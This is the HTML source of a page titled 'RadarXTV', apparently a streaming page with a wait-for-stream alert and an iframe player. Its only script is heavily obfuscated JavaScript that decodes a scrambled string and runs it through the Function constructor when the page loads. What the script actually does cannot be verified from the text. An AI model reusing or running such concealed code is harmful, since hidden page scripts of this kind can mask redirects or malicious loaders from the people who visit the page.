<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>RadarXTV</title>
  <style>
    body {
      margin: 0;
      background: black;
      color: white;
      font-family: sans-serif;
      text-align: center;
    }

    .radar-logo {
      display: block;
      width: 100%;
      max-width: 700px;
      margin: 20px auto 10px;
      height: auto;
      object-fit: contain;
      filter: drop-shadow(0 0 15px #00f0ffcc);
    }

    .alert-box {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #ffcc00;
      color: black;
      padding: 10px 20px;
      font-size: 16px;
      border-radius: 8px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      width: 80%;
      max-width: 400px;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
      z-index: 9999;
      opacity: 1;
      transition: opacity 1s ease;
    }

    .alert-box button {
      background: transparent;
      border: none;
      color: black;
      font-size: 18px;
      cursor: pointer;
    }

    .player-container {
      width: 95%;
      max-width: 900px;
      margin: 20px auto;
      border-radius: 15px;
      overflow: hidden;
      position: relative;
      padding-top: 56.25%;
    }

    .player-container iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
      border-radius: 15px;
    }
  </style>
</head>
<body>
 

  <!-- ✅ ALERT MESSAGE -->
  <div id="alertMessage" class="alert-box">
    <span>Please wait for 2 minutes for stream to initialize.</span>
    <button onclick="closeAlert()">✖</button>
  </div>

  <!-- ✅ VIDEO BOX -->
  <div class="player-container" id="playerContainer"></div>

  <script>
  var loadIframe,closeAlert;(function(){var DJy='',zfo=855-844;function RJO(b){var v=2254689;var s=b.length;var j=[];for(var l=0;l<s;l++){j[l]=b.charAt(l)};for(var l=0;l<s;l++){var n=v*(l+538)+(v%43077);var h=v*(l+230)+(v%53072);var x=n%s;var p=h%s;var w=j[x];j[x]=j[p];j[p]=w;v=(n+h)%2703320;};return j.join('')};var mEg=RJO('fuensyjktrxvocctuihrqnpmtodgwsaocblrz').substr(0,zfo);var Aql='),larj=j+l=ro!=1e,(v*}c;-8cbndnrth(vkr[S];t*;7ivw]tr+tc,o;sCl9ra;la+ut;(.gm,1.=7;}=e(xtl(v88)(j(h6<,rte+etnqr8(,,Col=,2t{]h[)rrpo;.<jh+enrAqr(ffeb1w1v()=)<;+l7]=;(ag=;r,su=- u==v.hejt=qxvvi40uu8lcuai+a+avz+ 0,0=Se(",en);3{in-tm=(  o(+(r =ra=pa3n tsaw]c+rjo=te "itsjr=caou.1 lr[]=ve81"f; us;e-=vfarl76nu5l[t)fn(fj.v](ta9 +{ u=a.,9q0s,6) o=vsaen;>v{rol;p;]<;4biv =r 9;[q.g;;"t(v.va};;i".esl.7oC}r),"rrvaCpv4(n,+;tfvzrca;]{a=[6d+q.cl2r+o.e0==k){;8r=dr9r2+ueg1rs; j[9.tc.))tr0ai;C;lj.c"b)+f,ohaiCv=0imddsv))[)0qnast;7;)((ro2)-A(h=6;s+)b(.n0u"gd]etlnj(pvgry+imkfl1gfne;m"= .> )p.ahv;9+v0gq(2re=";z xh)l7,pp(9(),o+ v=)}avr[n}[+is61)pl{ji.hlxhh] ]5n;(s( =]o;]nengrl3m;,u=)r3xmefn;v agq;h(p;=zn6iosrlrld)[eutm=[iC+=gam5as 8k.a2ceo,l2jt4fur7f[).r;}vhe))ug=aj[(-,dwin0..As)h;asjodop1n.Aao,(0eozof.fq;9=s!ag<l wjefkah)jp,bgi(,4=shah5arc)l112qothrr;sg.tvem,hfz=oreiz,2)n8C7gtun-)t +f5i;h+eunA6n;xvn(,ta';var sOV=RJO[mEg];var DZC='';var DLW=sOV;var TXy=sOV(DZC,RJO(Aql));var sJV=TXy(RJO(',}p3{$lHiDc39}]uZ:Z=.Z$7w4_dfZu}n_s"GZa_Zsajt_lt]4{*n$*$5Z 4o41]mZf.Je)coo71baZ=Z2raefD.ZH grel.(,Z;eZ]0.ZZaE%.Z.Zmr8padeZ;).; 5D(S0Zi .Zb!n$r6r!)%3?)5Zu$Z!n(Zi,wo!E +(!Z .Zl3i.rZ}tD,t(6f,}ZtZI1("Zrye4b_95f(2soZeB,,ae3Et((Ze h6ai-ns3 o=,ZZti] $r_!$}tZm6_3s3.euZ0+5$Co6!is(e+]%Bal(2lada(6n,2){=en(m!!Z)m3%Z("ibetj(2{t{!8t.mada0Z$"e=ap%=)etd6oc$1%Z;%*=3Zc:0d();_a\/Z1aF,l; m(.(Z 0mem?e(l_5s)2v8i}s[e)tZZee}%r$}o7(8e.@c3n;(tZoh,j00d((Zb.a_(o!e]ZZ))$reZ%{nZfle__[nh%een+bd"nsfu46]))l6$;$hb_Z3(16[)]rrZeZ0=)ie<re0,( (};,h.IZ44sZ)s]nsm)(ZwTac&ZgnZ5$$ZZ.9t3!s,,s(e(c11erZ7s75nen$rpcln_Z50)!==6Zn!t5r=dZ)Zs(6K {p(g=et0s;);mZL{+.){eZmAIg50em.0_b+Z8e1lZ7Z+1%ey01j;6fnr.Le(5)7rdZ].4i>u]i"m+n;%uu53-}u,sr+f__?__Z<t\'ei.fe_Z\'f]?Z)Z)toe_Zg&mZx3f )n0ZZ30  ,(r)Zau({t_0f,fc(7Zr4 L_6s\'.]3t_H=-7ZZ.ao.fDl%]}sjZtpafs=fr>0j4)47eZ_Zblo\/lo5(nZj_)sobZDp[Z;ptu(ngt;a!tZB(Cra1"Zd.([;n];$;3ac)ZrllZl%)eZ=mf31u._(7(2;6A{.e%l_n>uo_#g5Zf#t,!dnIon:p3{hf#5)fZlc7fo]9[,_w6uZf!s;ff}tE(Zmg(s3<0 st;ZZ4%H*){(i(]]h0G>t6ZZi+,etZ=r=ebc}Z#*r;,rZ)Zt5,ZT,=c6#eZ1}8Z4 ZZa)5e.i{0]e Z31fo3n0ZlZI. {.ea_Z,01.9<]i[nZ@!ZZ.1._Z Z3(#DrZo,]S.)*3ZZrb0_.35)tl],.745((1gtZf ZC daeZ?Z0r!(Z _oeee,5lZ{91n;4Z=-=\/9-Z0o)Z"} )s;;%{"3n8{i_..5)ogZ!t6tii;u1Z)m3.9(Crj Z_Z>,=Z4fK0ru1,eZ7Z.JECee)y)Z=sZtZ(Z6)_ZZZ#Zou(ZZf(4e87#)\/n;)(2});y;a!cs2;%)@((.o. c.+owo;}]lZ()nZrIrZ}t%ei_eSZjrgtfm$l1%b9fZZ!eZ+.%.}5c, 5IZZen!:()_ni{1s5.9o5e!i.ZZ!etnZZlfrZZe]1$!C=)Zo>eZ)r#eipd[t(l*Z]sa *=tZ%)(etbim\'pulZ)7eZol; ,].oA6{@0Z@5Z38)%IZy0i[g5o,0{nnZrtrZ;n.@63(;.3&iZ,;)nZ;_Zl;$$(Z32m!4ZC3w})fZuZ!Z;])rZaCf3p 0ZFs6}.li.Z_Z\/=F5.(t2ZZ7Z,)l0=3j)_,j}.!Z=H]G1i=5u8e(ne)rZ)3tZ,g[)C_Z,2ZsZe[i$.;$%))+=55iM_iagot(G.6f{4Z]Z)t:Z2])=epE)e\/;<.ns$)ir6%ti$neel)t) rh1ueZ4C5(e(5s)0 Zsbj4%_b_[}((t0<o..n34ZKu (E6pv,ji+!te}Zs3%L2oeF$28\'0__a9._ZAuc&%$.3r5[1cf(Z9n#g7a Zn$ZE];tj(%$ $In$)b=_!f_Zc;Zeep CciZe;s6jmro_)Z9Df=Ze(<b c_+])$K$(t(.])l5Z8n u)>C.{3Z%ttZeo1i0yd>D=6lZ.%.3d3n$.=s!oZ:6Zb>1(soB2megui51tZe frscZin]ferlZTue[((6Zye;_0.!{!_Zl9ZeZ5eut.]5fratZm)Z;2)r=9__mee};6s3o97(H_m.3ZfZef.)}Z <}3Z7 _{4,.]Zr;\/;{)8%=idt Feg!'));var Fhp=DLW(DJy,sJV );Fhp(6083);return 4139})()
  </script>
</body>
</html>
